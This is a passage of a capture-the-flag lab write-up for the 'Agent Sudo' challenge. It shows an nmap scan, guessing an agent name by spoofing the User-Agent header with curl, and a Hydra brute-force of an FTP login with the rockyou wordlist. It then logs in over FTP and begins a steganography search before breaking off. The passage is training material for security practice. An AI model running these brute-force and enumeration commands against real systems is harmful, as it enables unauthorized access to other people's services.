<h1 align="center">Challenge 025 - Agent Sudo </h1>
<p align="center">
  <img width="88" height="90" alt="Bildschirmfoto vom 2025-09-23 05-18-13" src="https://github.com/user-attachments/assets/19d3fb9b-772b-437a-8d26-1f5c6b459daf" />
</p>
<p align="center"> <b>Difficulty</b>: ???/10 <b>Completed</b>: ✔️  </p>

An easy CTF once again where we have to hack inside a server. I tend ot like challenges like these, so I just settled with this for today.

We deploy the machine and need to check for open ports through nmap.

```
root@ip-10-10-142-180:~# nmap -p- -sV 10.10.22.134
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-23 04:24 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.22.134
Host is up (0.00024s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:34:3F:CE:27:FB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

We have three open ports. 22 for ssh, 80 for http and one part 21 that is new to me. It holds the ftp service, which is a File Transfer Protocol, a network standard and service for transferring files between computers on a TCP/IP network, like the internet, using a client-server model where an FTP client requests and receives files from an FTP server, which stores and provides access to them.

When accessing the http service we see the following page

<img width="952" height="249" alt="Bildschirmfoto vom 2025-09-23 05-30-36" src="https://github.com/user-attachments/assets/e0e2a22c-acce-4f62-9172-bd8061b86b49" />

This suggests that we have to find out our codename and use tools like Burp Suite to manually modify the value of the user-agent to get access to this site, but without any other hints, we can't do much as of yet. It at least answers the second question though, which was asking how one could redirect himself to a secret page: through the user-agent.

Now the task is finding out the agent-name. For that we started working with Add-Ons for Firefox. The tool didn't quite work as I expected it too, and since I was too lazy to figure out the problem with said tool I just jumped to curl, where I knew I could just set the 'User-Agent' header with the *-A* flag. To make sure that I could also get ahead of any redirects the server might issue I appended a *-L* flag.

As the website itself mentioned an agent R, I just tried to walk through the alphabetical order and soon got a result when setting the User-Agent "C"

```
root@ip-10-10-220-150:~# curl -L -A "C" http://10.10.34.109
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

The output swiftly made clear that the agent name of agent C is Chris.

After having enumerated the machine with curl it's time to brute ourselves into the FTP service. For that we can use a tool like Hydra, which is known to brute-force passwords across various services.

```
root@ip-10-10-220-150:~# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.34.109
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-23 12:30:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.34.109:21/
[21][ftp] host: 10.10.34.109   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-23 12:31:27
```

Just as a reminder: 
- the *-l* flag is used to specify a single username for the brute-force attempt.
- the *-P* flag is used to provide a path to a password list that Hydra will utilize to attempt to crack the password for the specified username.

Having completed this brute force attack, we can see clear as day what chris's password is: crystal. We use that to our advantage to login to the FTP service. 

```
root@ip-10-10-220-150:~# ftp 10.10.34.109
Connected to 10.10.34.109.
220 (vsFTPd 3.0.3)
Name (10.10.34.109:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

As this was my first time being confronted with an FTP service I was not quite sure which kind of commands to use. *?* gave some clarity, but it will probably take it's time until i got the complete breakthrough. For now I just tried to retireve the *To_agentJ.txt* file, which I did by setting the transfer mode and then retrieving the file

```
ftp> type ascii
200 Switching to ASCII mode.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
WARNING! 6 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
217 bytes received in 0.00 secs (344.0164 kB/s)
ftp> quit
221 Goodbye.
```

After having done that we are able to cat the text file in our home directory.

```
root@ip-10-10-220-150:~# cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Aw man. I forgot to retrieve those png's too. Welp can't be helped. I reconnected and retrieved those as well.

```
ftp> type binary
200 Switching to Binary mode.
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.00 secs (102.6222 MB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.00 secs (23.8878 MB/s)
ftp> quit
221 Goodbye.
```

At least this gave me some first hands-on experience with FTP and when to use Ascii and Binary.

When checking the pictures we have these cute images

<p align="center">
  <img width="400" height="400" alt="Bildschirmfoto vom 2025-09-23 14-00-58" src="https://github.com/user-attachments/assets/10375366-165b-4f75-8930-5e76d5251659" />
  &nbsp;&nbsp;&nbsp;
  <img width="400" height="400" alt="Bildschirmfoto vom 2025-09-23 14-05-20" src="https://github.com/user-attachments/assets/83674115-c9a4-4173-8995-664a14c648ce" />
</p>

One of those pictures apparently has some sort of login password hidden. Clear case of steganography. Let's make use of the Steganographic Decoder. Without any passwords there doesn't seem to be any kind of file hidden, so I tried making use of the binwalk tool, which for some reason was a real hassle to get working in the VM. It was such an inconvenience that I was about to pivot to other tools, which didn't work either though. After reinstalling binwalk it seemed to work though. Finally.


